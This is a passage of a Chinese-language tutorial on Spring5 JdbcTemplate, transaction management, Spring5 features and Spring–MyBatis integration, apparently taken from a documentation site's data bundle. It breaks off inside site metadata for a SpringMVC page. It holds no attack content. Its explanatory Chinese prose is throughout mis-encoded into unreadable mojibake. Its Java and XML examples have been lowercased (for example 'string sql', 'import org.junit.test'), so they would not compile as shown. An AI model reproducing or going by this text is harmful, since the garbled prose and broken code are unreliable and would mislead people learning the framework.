com.pwddd.spring5.jdbc.service.bookservice;\nimport org.junit.test;\nimport org.springframework.context.applicationcontext;\nimport org.springframework.context.support.classpathxmlapplicationcontext;\n\npublic class testjdbc {\n\n@test\npublic void testjdbc(){\n\tapplicationcontext applicationcontext =\n\t\t\tnew classpathxmlapplicationcontext("bean1.xml");\n\tbookservice bookserviceimpl = applicationcontext.getbean("bookserviceimpl", bookservice.class);\n\tsystem.out.println(bookserviceimpl);\n}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# crud\n\n# cud\n\nå¨è¿è¡å¢å æ¹æä½ï¼è°ç¨jdbctemplateçupdateæ¹æ³è¿è¡ã\n\n\n\nè¯¥æ¹æ³æä¸¤ä¸ªåæ°ï¼ç¬¬ä¸ä¸ªä¸ºsqlè¯­å¥ãç¬¬äºä¸ªä¸ºå¯ååæ°ã æµè¯ä»£ç ï¼\n\npackage com.pwddd.spring5.jdbc.dao.impl;\n\nimport com.pwddd.spring5.jdbc.dao.bookdao;\nimport com.pwddd.spring5.jdbc.entity.book;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.jdbc.core.jdbctemplate;\nimport org.springframework.stereotype.component;\n\n@component\npublic class bookdaoimpl implements bookdao {\n    @autowired\n    private jdbctemplate jdbctemplate;\n\n    @override\n    public int add(book book) {\n        string sql = "insert into book values(?,?,?)";\n        object[] args = {book.getbookid(),book.getbookname(),book.getbookauthor()};\n        return jdbctemplate.update(sql,args);\n    }\n\n    @override\n    public int deletebookbyid(string id) {\n        string sql = "delete from book where bookid=?";\n        object[] args = {id};\n        return jdbctemplate.update(sql,args);\n    }\n\n    @override\n    public int updatebookinfo(book book) {\n        string sql = "update book set bookname=?,bookauthor=? where bookid=?";\n        object[] args = {book.getbookname(),book.getbookauthor(),book.getbookid()};\n        return jdbctemplate.update(sql,args);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n# r\n\njdbctemplateæ¥è¯¢æ»å±åä¸ºä¸ç§æåµï¼\n\n * ä½¿ç¨èåå½æ°æ¥è¯¢åä¸ªå¼\n * æ¥è¯¢åæ¡è®°å½ä¿¡æ¯\n * æ¥è¯¢åè¡¨\n\n# åå¼æ¥è¯¢\n\nåå¼æ¥è¯¢æ¯å©ç¨sqlè¯­å¥çèåå½æ°å¦countæ¥è¯¢åä¸ªå­æ®µãä½¿ç¨å¦ä¸æ¹æ³è¿è¡æ¥è¯¢ï¼\n\n\n\nè¯¥æ¹æ³å±ä¸¤ä¸ªåæ°ï¼ç¬¬ä¸ä¸ªä¸ºsqlè¯­å¥ï¼ç¬¬äºä¸ªåæ°ä¸ºè¿åå¼çç±»åã å®ä¾ä»£ç ï¼\n\n@override\npublic int querybooknum() {\n    string sql = "select count(*) from book";\n    integer integer = jdbctemplate.queryforobject(sql, integer.class);\n    return integer;\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n# åæ¡è®°å½æ¥è¯¢\n\nåæ¡è®°å½æ¥è¯¢çç»æå¯¹åºä¸ä¸ªå®ä½ç±»ãä½¿ç¨å¦ä¸çæ¹æ³è¿è¡æ¥è¯¢ï¼\n\n\n\nè¯¥æ¹æ³æä¸ä¸ªåæ°ï¼\n\n * sqlè¯­å¥\n * rowmapper æ¯æ¥å£ï¼éå¯¹è¿åä¸åç±»åæ°æ®ï¼ä½¿ç¨è¿ä¸ªæ¥å£éé¢å®ç°ç±»å®ææ°æ®å°è£\n * å¯åçsqlè¯­å¥åæ°ã\n\nå®ä¾ä»£ç ï¼\n\n@override\npublic book querybookbyid(string id) {\n    string sql = "select * from book where bookid=?";\n    book book = jdbctemplate.queryforobject(sql, new beanpropertyrowmapper<book>(book.class), id);\n    return book;\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n# éåæ¥è¯¢\n\néåæ¥è¯¢çæ¥è¯¢ç»ææ¯ä¸ä¸ªéåï¼ä½¿ç¨å¦ä¸çæ¹æ³è¿è¡æ¥è¯¢ï¼\n\n\n\nè¯¥æ¹æ³çåæ°ç±»ä¼¼åæ¡è®°å½æ¥è¯¢ã\n\nå®ä¾ä»£ç ï¼\n\n@override\npublic list<book> queryallbook() {\n    string sql = "select * from book";\n    list<book> books = jdbctemplate.query(sql, new beanpropertyrowmapper<book>(book.class));\n    return books;\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n# æ¹éæä½\n\nä»¥ä¸çæ¹æ³é½åªè½åæ¬¡å¤çåæ¡æ°æ®ï¼å¾å¾éå°éè¦æ¹éå¤çæ°æ®åºæ°æ®çéæ±ï¼ä¸é¢çæ¹æ³å°±åä¸ä»å¿äºãjdbctemplateä¹æä¾äºæ°æ®åºæ¹éæä½çæ¹æ³ã\n\n\n\nè¯¥æ¹æ³çåæ°åä¸é¢å¢å æ¹çæä½æ¹æ³ç¸ä¼¼ï¼åªæ¯å¯ååæ°æ¢æäºobjectæ°ç»çlistéåï¼åä¸ªobjectæ°ç»å¯¹åºæ°æ®åºä¸­çä¸ä¸ªè®°å½ã\n\nå®ä¾ä»£ç ï¼\n\n@override\npublic void batchdelete(list<object[]> args) {\n    string sql = "delete from book where bookid=?";\n    jdbctemplate.batchupdate(sql,args);\n}\n\n@override\npublic void batchupdate(list<object[]> args) {\n    string sql = "update book set bookname=?,bookauthor=? where bookid=?";\n    jdbctemplate.batchupdate(sql,args);\n}\n\n@override\npublic void batchadd(list<object[]> args) {\n    string sql = "insert into book values(?,?,?)";\n    jdbctemplate.batchupdate(sql,args);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\næµè¯ä»£ç ï¼\n\n@test\npublic void batch(){\n    list<object[]> addargs = new arraylist<>();\n    object[] o1 = {"100","test100","a100"};\n    object[] o2 = {"200","test200","a200"};\n    object[] o3 = {"300","test300","a300"};\n    addargs.add(o1);\n    addargs.add(o2);\n    addargs.add(o3);\n//        bookserviceimpl.batchadd(addargs);\n    list<object[]> updateargs = new arraylist<>();\n    object[] ou1 = {"test100","a100","100"};\n    object[] ou2 = {"test200","a200","200"};\n    object[] ou3 = {"test300","a300","300"};\n    updateargs.add(ou1);\n    updateargs.add(ou2);\n    updateargs.add(ou3);\n    bookserviceimpl.batchupdate(updateargs);\n    list<object[]> delargs = new arraylist<>();\n    object[] od1 = {"100"};\n    object[] od2 = {"300"};\n    delargs.add(od1);\n    delargs.add(od2);\n    bookserviceimpl.batchdelete(delargs);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n\n# äºå¡\n\n\n# æ¦å¿µ\n\näºå¡æ¯æ°æ®åºæä½æåºæ¬ååï¼é»è¾ä¸ä¸ç»æä½ï¼è¦ä¹é½æåï¼å¦ææä¸ä¸ªå¤±è´¥æææä½é½å¤±è´¥ãå¸åçä¸å¡åºæ¯å°±æ¯è½¬è´¦ï¼lucy è½¬è´¦ 100 å ç» maryï¼lucy å° 100ï¼mary å¤ 100\n\näºå¡æåä¸ªç¹æ§ï¼\n\n * åå­æ§\n * ä¸è´æ§\n * éç¦»æ§\n * æä¹æ§\n\n\n# æµè¯ä»£ç \n\næ¨¡æä¸è¿°çè½¬è´¦çä¾å­\n\n 1. åå»ºdao\n\npackage com.pwddd.dao.impl;\n\nimport com.pwddd.dao.userdao;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.jdbc.core.jdbctemplate;\nimport org.springframework.stereotype.repository;\n\n@repository\npublic class userdaoimpl implements userdao {\n    @autowired\n    private jdbctemplate jdbctemplate;\n\n    @override\n    public void reducemoney() {\n        string sql = "update bank set money=money-100 where id=1";\n        jdbctemplate.update(sql);\n    }\n\n    @override\n    public void addmoney() {\n        string sql = "update bank set money=money+100 where id=2";\n        jdbctemplate.update(sql);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n 2. åå»ºservice\n\npackage com.pwddd.service.impl;\n\nimport com.pwddd.dao.userdao;\nimport com.pwddd.service.userservice;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.stereotype.service;\n\n@service\npublic class userserviceimpl implements userservice {\n    @autowired\n    private userdao userdao;\n\n    @override\n    public void accountmoney() {\n        userdao.reducemoney();\n\n        int i = 1/0;\n        userdao.addmoney();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\nå¦ææ²¡æäºå¡ï¼åå½å°é±ä¹åæ¥éï¼æ²¡æå¤é±ï¼å°±ä¼å¯¼è´ä¸ä¸è´çæåµã\n\n\n# äºå¡çæä½è¿ç¨\n\näºå¡æ·»å å° javaee ä¸å±ç»æéé¢ service å±ï¼ä¸å¡é»è¾å±ï¼ å¨ spring è¿è¡äºå¡ç®¡çæä½æä¸¤ç§æ¹å¼ï¼\n\n * ç¼ç¨å¼äºå¡ç®¡ç\n * å£°æå¼äºå¡ç®¡çï¼ä½¿ç¨ï¼\n\nç¼ç¨å¼äºå¡ç®¡çå¦å¾ï¼\n\n\n\nå£°æå¼äºå¡ç®¡çæä¸¤ç§å®ç°æ¹å¼ï¼\n\n * åºäºæ³¨è§£çå®ç°\n * åºäºxmlçå®ç°\n\nå¨ spring è¿è¡å£°æå¼äºå¡ç®¡çï¼åºå±ä½¿ç¨ aop åçï¼spring äºå¡ç®¡ç api æä¾ä¸ä¸ªæ¥å£ï¼ä»£è¡¨äºå¡ç®¡çå¨ï¼è¿ä¸ªæ¥å£éå¯¹ä¸åçæ¡æ¶æä¾ä¸åçå®ç°ç±»ã\n\n\n\n\n# åºäºæ³¨è§£æ¹å¼çäºå¡ç®¡ç\n\nå®å¨æ³¨è§£å¼åçæ¹å¼è¿è¡äºå¡ç®¡çï¼\n\npackage com.pwddd.config;\n\nimport com.alibaba.druid.pool.druiddatasource;\nimport org.springframework.context.annotation.bean;\nimport org.springframework.context.annotation.componentscan;\nimport org.springframework.context.annotation.configuration;\nimport org.springframework.jdbc.core.jdbctemplate;\nimport org.springframework.jdbc.datasource.datasourcetransactionmanager;\nimport org.springframework.transaction.transactionmanager;\nimport org.springframework.transaction.annotation.enabletransactionmanagement;\n\nimport javax.sql.datasource;\n\n@configuration\n@componentscan(basepackages = "com.pwddd")\n@enabletransactionmanagement  // å¼å¯äºå¡\npublic class springconfig {\n\n    @bean\n    public druiddatasource getdatasource(){\n        druiddatasource druiddatasource = new druiddatasource();\n        druiddatasource.seturl("jdbc:mysql://localhost:3306/srping5test");\n        druiddatasource.setdriverclassname("com.mysql.jdbc.driver");\n        druiddatasource.setusername("root");\n        druiddatasource.setpassword("123456");\n        return druiddatasource;\n    }\n\n    @bean\n    public jdbctemplate getjdbctemplete(druiddatasource datasource){\n        jdbctemplate jdbctemplate = new jdbctemplate();\n        jdbctemplate.setdatasource(datasource);\n        return jdbctemplate;\n    }\n\n    @bean\n    public transactionmanager gettransactionmanager(datasource datasource){\n        datasourcetransactionmanager datasourcetransactionmanager = new datasourcetransactionmanager();\n        datasourcetransactionmanager.setdatasource(datasource);\n        return datasourcetransactionmanager;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\nå¨æ³è¦è¿è¡äºå¡çç±»æèæ¹æ³ä¸æ·»å æ³¨è§£\n\npackage com.pwddd.service.impl;\n\nimport com.pwddd.dao.userdao;\nimport com.pwddd.service.userservice;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.stereotype.service;\nimport org.springframework.transaction.annotation.transactional;\n\n@service\n@transactional(propagation = propagation.required,isolation = isolation.repeatable_read)\npublic class userserviceimpl implements userservice {\n    @autowired\n    private userdao userdao;\n\n    @override\n    public void accountmoney() {\n        userdao.reducemoney();\n\n        int i = 1/0;\n        userdao.addmoney();\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n# æ³¨è§£ç¸å³åæ°è§£é\n\nå¨ service ç±»ä¸é¢æ·»å æ³¨è§£@transactionalï¼å¨è¿ä¸ªæ³¨è§£éé¢å¯ä»¥éç½®äºå¡ç¸å³åæ°ã\n\n\n\n# propagationï¼äºå¡ä¼ æ­è¡ä¸º\n\n\n\n\n\n# ioslationï¼äºå¡éç¦»çº§å«\n\näºå¡æç¹æ§æä¸ºéç¦»æ§ï¼å¤äºå¡æä½ä¹é´ä¸ä¼äº§çå½±åãä¸èèéç¦»æ§äº§çå¾å¤é®é¢ãå¨éç¦»æ§ä¸­å¸¸è§çä¸ä¸ªé®é¢æ¯ï¼èè¯»ãä¸å¯éå¤è¯»ãèï¼å¹»ï¼è¯»ã\n\n 1. èè¯»ï¼ä¸ä¸ªæªæäº¤äºå¡è¯»åå°å¦ä¸ä¸ªæªæäº¤äºå¡çæ°æ®\n\n\n\n 2. ä¸å¯éå¤è¯»ï¼ä¸ä¸ªæªæäº¤äºå¡è¯»åå°å¦ä¸æäº¤äºå¡ä¿®æ¹æ°æ®\n\n\n\n 3. èè¯»ï¼ä¸ä¸ªæªæäº¤äºå¡è¯»åå°å¦ä¸æäº¤äºå¡æ·»å æ°æ®\n\nè§£å³ä»¥ä¸é®é¢ï¼å¯ä»¥éç½®æ³¨è§£çç¸å³åæ°ã\n\n\n\n# timeoutï¼è¶æ¶æ¶é´\n\näºå¡éè¦å¨ä¸å®æ¶é´åè¿è¡æäº¤ï¼å¦æä¸æäº¤è¿è¡åæ»ãé»è®¤å¼æ¯ -1 ï¼è®¾ç½®æ¶é´ä»¥ç§åä½è¿è¡è®¡ç®ã\n\n# readonlyï¼æ¯å¦åªè¯»\n\nè¯»ï¼æ¥è¯¢æä½ï¼åï¼æ·»å ä¿®æ¹å é¤æä½ï¼readonly é»è®¤å¼ falseï¼è¡¨ç¤ºå¯ä»¥æ¥è¯¢ï¼å¯ä»¥æ·»å ä¿®æ¹å é¤æä½ãè®¾ç½® readonly å¼æ¯ trueï¼è®¾ç½®æ true ä¹åï¼åªè½æ¥è¯¢ã\n\n# rollbackforï¼åæ»\n\nè®¾ç½®åºç°åªäºå¼å¸¸è¿è¡äºå¡åæ»\n\n# norollbackforï¼ä¸åæ»\n\nè®¾ç½®åºç°åªäºå¼å¸¸ä¸è¿è¡äºå¡åæ»\n\n\n# åºäºxmléç½®äºå¡\n\nç¤ºä¾ä»£ç ï¼\n\n<?xml version="1.0" encoding="utf-8"?>\n<beans xmlns="http://www.springframework.org/schema/beans"\n       xmlns:xsi="http://www.w3.org/2001/xmlschema-instance"\n       xmlns:context="http://www.springframework.org/schema/context"\n       xmlns:tx="http://www.springframework.org/schema/tx"\n       xmlns:aop="http://www.springframework.org/schema/aop"\n       xsi:schemalocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\n                http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd\n                http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx.xsd\n                http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd">\n    <context:component-scan base-package="com.pwddd" />\n    <context:property-placeholder location="classpath:jdbc.properties" />\n    <bean id="datasource" class="com.alibaba.druid.pool.druiddatasource">\n        <property name="driverclassname" value="${jdbc.driver}" />\n        <property name="password" value="${jdbc.password}" />\n        <property name="username" value="${jdbc.username}" />\n        <property name="url" value="${jdbc.url}" />\n    </bean>\n    <bean id="transcationmanager" class="org.springframework.jdbc.datasource.datasourcetransactionmanager">\n        <property name="datasource" ref="datasource" />\n    </bean>\n\n    <tx:advice id="txadvice">\n        <tx:attributes>\n            <tx:method name="accountmoney" propagation="required"/>\n        </tx:attributes>\n    </tx:advice>\n\n    <aop:config>\n        <aop:pointcut id="pt" expression="execution(* com.pwddd.service.impl.userserviceimpl.*(..))"/>\n        <aop:advisor advice-ref="txadvice" pointcut-ref="pt" />\n    </aop:config>\n\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n\n# spring5æ°ç¹æ§\n\n\n# æ¦è¿°\n\n> æ´ä¸ª spring5 æ¡æ¶çä»£ç åºäº java8ï¼è¿è¡æ¶å¼å®¹ jdk9ï¼è®¸å¤ä¸å»ºè®®ä½¿ç¨çç±»åæ¹ æ³å¨ä»£ç åºä¸­å é¤\n\n\n# æ´åæ¥å¿æ¡æ¶\n\nspring 5.0 æ¡æ¶èªå¸¦äºéç¨çæ¥å¿å°è£ãå¹¶ä¸å·²ç»ç§»é¤ log4jconfiglistenerï¼å®æ¹å»ºè®®ä½¿ç¨ log4j2ã\n\n 1. å¯¼å¥jarå\n\n\n\n 2. åå»ºlog4j2.xmlæä»¶\n\n<?xml version="1.0" encoding="utf-8"?>\n<configuration status="debug">\n    <appenders>\n        <console name="console" target="system_out">\n            <patternlayout pattern="%d{hh:mm:ss.sss} [%t] %-5level %logger{36} - %msg%n"/>\n        </console>\n    </appenders>\n    <loggers>\n        <root level="error">\n            <appenderref ref="console"/>\n        </root>\n    </loggers>\n</configuration>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# nullableæ³¨è§£\n\n@nullable æ³¨è§£å¯ä»¥ä½¿ç¨å¨æ¹æ³ä¸é¢ï¼å±æ§ä¸é¢ï¼åæ°ä¸é¢ãè¡¨ç¤ºæ¹æ³è¿åå¯ä»¥ä¸ºç©ºï¼å±æ§å¼å¯ä»¥ ä¸ºç©ºï¼åæ°å¼å¯ä»¥ä¸ºç©ºæ³¨è§£ã\n\n\n# æ ¸å¿å®¹å¨æ¯æå½æ°å¼é£æ ¼\n\nå®ä¾ä»£ç ï¼\n\n@test\n    public void testgenericapplicationcontext() {\n        //1 åå»º genericapplicationcontext å¯¹è±¡\n        genericapplicationcontext context = new genericapplicationcontext();\n        //2 è°ç¨ context çæ¹æ³å¯¹è±¡æ³¨å\n        context.refresh();\n        context.registerbean("user1",user.class,() -> new user());\n        //3 è·åå¨ spring æ³¨åçå¯¹è±¡\n        // user user = (user)context.getbean("com.atguigu.spring5.test.user");\n        user user = (user)context.getbean("user1");\n        system.out.println(user);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# æ¯ææ´åjunit5\n\n 1. å¼å¥spring testçä¾èµå\n\n 2. ç¼åjunit4æµè¯ç±»\n\npackage com.pwddd.spring5new.test;\n\nimport com.pwddd.spring5new.config.springconfig;\nimport com.pwddd.spring5new.service.userservice;\nimport org.junit.test;\nimport org.junit.runner.runwith;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.test.context.contextconfiguration;\nimport org.springframework.test.context.junit4.springjunit4classrunner;\n\n@runwith(springjunit4classrunner.class)\n@contextconfiguration(classes = springconfig.class)\npublic class testjunit {\n    @autowired\n    private userservice userservice;\n\n    @test\n    public void testadd(){\n        userservice.add();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n 3. æ´åjunit5\n\npackage com.pwddd.spring5new.test;\n\nimport com.pwddd.spring5new.config.springconfig;\nimport com.pwddd.spring5new.service.userservice;\nimport org.junit.jupiter.api.test;\nimport org.junit.jupiter.api.extension.extendwith;\nimport org.springframework.beans.factory.annotation.autowired;\nimport org.springframework.test.context.contextconfiguration;\nimport org.springframework.test.context.junit.jupiter.springextension;\n\n@extendwith(springextension.class)\n@contextconfiguration(classes = springconfig.class)\npublic class testjunit5 {\n    @autowired\n    private userservice userservice;\n    @test\n    public void test(){\n        userservice.add();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n 4. ä½¿ç¨ä¸ä¸ªæ³¨è§£ä»£æ¿ä¸é¢çä¸¤ä¸ªæ³¨è§£\n\n//@extendwith(springextension.class)\n//@contextconfiguration(classes = springconfig.class)\n@springjunitconfig(classes = springconfig.class)\n\n\n1\n2\n3\n\n\n\n# springwebflux\n\nåç½®ç¥è¯ï¼springmvcãjava8æ°ç¹æ§ãspringboot\n\n#todo\n\n\n# springæ´åmybatis\n\nç®åæä»¬å¼ååè½çæµç¨ä¸­ï¼å¨serviceå±ä¼æå¨åå»ºsqlsessionå¯¹è±¡ï¼å¹¶ä½¿ç¨sqlsessionå¯¹è±¡è·åmapperæ¥å£çå®ä¾åå¯¹è±¡ï¼ä½æ¯æä»¬çæ­£ä½¿ç¨çæ¯mapperæ¥å£çå¯¹è±¡ï¼ç®åçä»£ç ç¼åæ¹å¼æå¤§çå½±åäºå¼åæçï¼èä¸mybatiså±åserviceå±ä¹é´çè¦åæ§éå¸¸é«ã ä½¿ç¨springiocææ¯å®ç°serviceå±åmybatiså±çè§£è¦ï¼è®©springå®¹å¨å¸®æä»¬è·åmapperå±æ¥å£çå®ä¾å å¯¹è±¡ï¼æä»¬ç´æ¥ä»springå®¹å¨ä¸­è·åä½¿ç¨å³å¯ã å¨ä¸å¡å±ä½¿ç¨springå®¹å¨å¯¹è±¡è·åmapperæ¥å£å®ä¾åå¯¹è±¡åï¼å®ç°äºserviceå±åmybatiså±çè§£è¦ï¼ä½æ¯å¨controllerå±æä»¬ä¾ç¶å¨servletä¸­ç´æ¥åå»ºserviceå¯¹è±¡ï¼è¦åæ§è¿é«ã å°serviceå¯¹è±¡éç½®ä¸ºbeanå¯¹è±¡ï¼servletä¸­ä»springå®¹å¨ä¸­ï¼è·åserviceå¯¹è±¡ï¼å®æåè½å¼åãåæ¶ä¼ ç»çè·åspringå®¹å¨çæ¹æ³åå¨æ¯ä¸ªservletçserviceæ¹æ³ä¸­ï¼åè®¾æ¯ä¸ªè¯·æ±è°ç¨serviceé½è¦åå»ºä¸ä¸ªservletï¼é£ä¹å°±ä¼é æå®¹å¨çèµæºæµªè´¹ã\n\nåå«éç½®æ°æ®æºï¼sqlsessionfactoryï¼æ«æmapper\n\n<bean class="org.springframework.jdbc.datasource.drivermanagerdatasource" id="datasource">\n<property name="url" value="jdbc:mysql://localhost:3306/test?characterencoding=utf8&usessl=false&servertimezone=asia/shanghai"/>\n<property name="driverclassname" value="com.mysql.jdbc.driver" />\n<property name="username" value="root" />\n<property name="password" value="123456" />\n</bean>\n\n\x3c!--    éç½®sqlsessionfactory--\x3e\n<bean class="org.mybatis.spring.sqlsessionfactorybean" id="factory">\n<property name="datasource" ref="datasource" />\n</bean>\n\n\x3c!--    éç½®æ«æmapper--\x3e\n<bean class="org.mybatis.spring.mapper.mapperscannerconfigurer" id="mapperscanner">\n<property name="sqlsessionfactory"  ref="factory"/>\n<property name="basepackage" value="pers.jm.mapper"/>\n</bean>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\néç½®serviceå±bean serviceå±éè¦è°ç¨mapperå±çæ¹æ³ï¼å æ­¤å¨serviceä¸­éè¦mapperå±çå¯¹è±¡ãå¨serviceå±ä¸­å£°æmapperå±çå¼ç¨ï¼å¹¶ä¸ºä¹åå»ºgetsetæ¹æ³ã\n\nusermapper usermapper;\n\n  public usermapper getusermapper() {\n      return usermapper;\n  }\n\n  public void setusermapper(usermapper usermapper) {\n      this.usermapper = usermapper;\n  }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nä¹åéç½®serviceå±çbean,æ·»å èªå¨æ«æmapperç±»çå¯¹è±¡å¼ç¨\n\n<bean class="pers.jm.service.userserviceimpl" id="userservice">\n    <property name="usermapper" ref="usermapper" />\n</bean>\n\n\n1\n2\n3\n\n\nå¨web.xmlå è½½springçéç½®æä»¶å¹¶è®¾ç½®çå¬å¨\n\n<context-param>\n    <param-name>contextconfiglocation</param-name>\x3c!--é®å--\x3e\n    <param-value>classpath:applicationcontext.xml</param-value>\x3c!--å¼--\x3e\n  </context-param>\n  <listener>\n    <listener-class>\n      org.springframework.web.context.contextloaderlistener\n    </listener-class>\n  </listener>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nå¨servletçinitæ¹æ³ä¸­ï¼è·åå¯¹è±¡\n\nuserservice userservice;\n@override\npublic void init() throws servletexception {\n    webapplicationcontext webapplicationcontext = webapplicationcontextutils.getwebapplicationcontext(this.getservletcontext());\n    userservice = (userservice) webapplicationcontext.getbean("userservice");\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\nè³æ­¤ï¼servlet â service â mapper ä¾èµéç½®å®æ\n\nå½æå¡å¨å¯å¨æ¶ï¼éè¿web.xmlä¸­éç½®ççå¬å¨ï¼å è½½springçéç½®æä»¶ï¼springéç½®æä»¶å è½½åï¼è®¾ç½®mybatisçæ°æ®æºï¼sqlsessionç­å¹¶æ«æåå»ºå¯¹åºçmapperå¯¹è±¡ãmapperå¯¹è±¡åå»ºåï¼æ ¹æ®éç½®åå»ºserviceçå¯¹è±¡ï¼serviceå¯¹è±¡ä¸­æ³¨å¥mapperå±çå¯¹è±¡å¼ç¨ãå æ­¤servletè·åserviceå¯¹è±¡ï¼å®éä¸è·åçæ¯ æmapperå¼ç¨çserviceå±å¯¹è±¡ã',charsets:{cjk:!0},lastUpdated:"2022/05/16, 15:55:31",lastUpdatedTimestamp:1652716531e3},{title:"SpringMVC",frontmatter:{title:"SpringMVC",date:"2022-01-06T00:00:00.000Z",permalink:"/dev/java/core/springmvc",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["å¼å","åç«¯","å¾®æå¡æ ¸å¿"],tags:["SSM","SpringMVC"],readingShow:"top"},regularPath:"/01.%E5%BC%80%E5%8F%91/101.%E5%90%8E%E7%AB%AF/1011.%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%A0%B8%E5%BF%83/01.SpringMVC.html",relativePath:"01.å¼å/101.åç«¯/1011.å¾®æå¡æ ¸å¿/01.SpringMVC.md",key:"v-3ddfa200",path:"/dev/java/core/springmvc/",headers:[{level:2,title:"SpringMVCç®ä»",slug:"springmvcç®ä»",normalizedTitle:"springmvcç®ä»",charIndex:16},{level:3,title:"ä»ä¹æ¯MVC",slug:"ä»ä¹æ¯mvc",normalizedTitle:"ä»ä¹æ¯mvc",charIndex:32},{level:3,title:"ä»ä¹æ¯SpringMVC",slug:"ä»ä¹æ¯springmvc",normalizedTitle:"ä»ä¹æ¯springmvc",charIndex:451},{level:3,title:"SpringMVCçç¹ç¹",slug:"springmvcçç¹ç¹",normalizedTitle:"springmvcçç¹ç¹",charIndex:689},{level:2,title:"MVCå¼åç¯å¢æ­å»º",slug:"mvcå¼åç¯å¢æ­å»º",normalizedTitle:"mvcå¼åç¯å¢æ­å»º",charIndex:921},{level:3,title:"Mavené¡¹ç®åå»º",slug:"mavené¡¹ç®åå»º",normalizedTitle:"mavené¡¹ç®åå»º",charIndex:935},{level:3,title:"Web.xmléç½®æä»¶",slug:"web-xmléç½®æä»¶",normalizedTitle:"web.xmléç½®æä»¶",charIndex:1872},{level:3,title:"åå»ºè¯·æ±æ§å¶å¨",slug:"åå»ºè¯·æ±æ§å¶å¨",normalizedTitle:"åå»ºè¯·æ±æ§å¶å¨",charIndex:3802},{level:3,title:"åå»ºSpringMVCéç½®æä»¶",slug:"åå»ºspringmvcéç½®æä»¶",normalizedTitle:"åå»ºspringmvcéç½®æä»¶",charIndex:4069},{level:3,title:"æµè¯",slug:"æµè¯",normalizedTitle:"æµè¯",charIndex:5718},{level:3,title:"æ»ç»",slug:"æ»ç»",normalizedTitle:"æ»ç»",charIndex:6374},{level:2,title:"RequestMappingæ³¨è§£",slug:"requestmappingæ³¨è§£",normalizedTitle:"requestmappingæ³¨è§£",charIndex:5757},{level:3,title:"@RequestMappingæ³¨è§£çåè½",slug:"requestmappingæ³¨è§£çåè½",normalizedTitle:"@requestmappingæ³¨è§£çåè½",charIndex:6659},{level:3,title:"@RequestMappingæ³¨è§£çä½ç½®",slug:"requestmappingæ³¨è§£çä½ç½®",normalizedTitle:"@requestmappingæ³¨è§£çä½ç½®",charIndex:6794},{level:3,title:"@RequestMappingæ³¨è§£çvalueå±æ§",slug:"requestmappingæ³¨è§£çvalueå±æ§",normalizedTitle:"@requestmappingæ³¨è§£çvalueå±æ§",charIndex:5795},{level:3,title:"@RequestMappingæ³¨è§£çmethodå±æ§",slug:"requestmappingæ³¨è§£çmethodå±æ§",normalizedTitle:"@requestmappingæ³¨è§£çmethodå±æ§",charIndex:7643},{level:3,title:"@RequestMappingæ³¨è§£çparamså±æ§",slug:"requestmappingæ³¨è§£çparamså±æ§",normalizedTitle:"@requestmappingæ³¨è§£çparamså±æ§",charIndex:8524},{level:3,title:"@RequestMappingæ³¨è§£çheaderså±æ§",slug:"requestmappingæ³¨è§£çheaderså±æ§",normalizedTitle:"@requestmappingæ³¨è§£çheaderså±æ§",charIndex:9295},{level:3,title:"SpringMVCæ¯æanté£æ ¼çè·¯å¾",slug:"springmvcæ¯æanté£æ ¼çè·¯å¾",normalizedTitle:"springmvcæ¯æanté£æ 